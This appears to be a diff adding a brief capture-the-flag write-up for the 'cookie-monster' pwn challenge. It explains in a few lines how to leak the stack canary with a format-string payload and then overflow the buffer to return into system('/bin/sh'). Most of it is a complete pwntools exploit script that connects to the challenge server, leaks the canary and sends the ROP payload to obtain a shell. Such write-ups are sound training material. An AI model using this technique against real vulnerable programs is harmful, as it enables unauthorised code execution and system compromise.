@@ -1,0 +1,29 @@
+This pwn challenge involved using buffer overflow with stack canary
+
+to identify stack canary it actually ends with 2 zeroes 100 or 200 (the hex address)
+
+so first format string exploit was used to find out at what position i get canary 
+turns out its 15
+
+then feed the canary along with the buffer overflow
+and then rop call system with binsh
+
+from pwn import *
+elf = ELF("./cookie-monster")
+# p=elf.process()
+p=remote("chals.damctf.xyz" ,31312)
+rop = ROP(elf)  
+sys = p32(elf.sym.plt.system)
+binsh = p32(0x08048770) 
+pay1 = b"%15$p"
+p.recv()
+p.sendline(pay1)
+canary=int(p.recvline().strip().decode()[6:],16)
+pay2 = b'a'*32 + p32(canary) +  b'a' * 12  + sys + b"aaaa" + binsh
+# pay2 = b'a' * 32 + flat(canary,0,0,0,sys,0,binsh)
+print(len(pay2))
+p.recv()
+p.sendline(pay2)
+
+
+p.interactive()
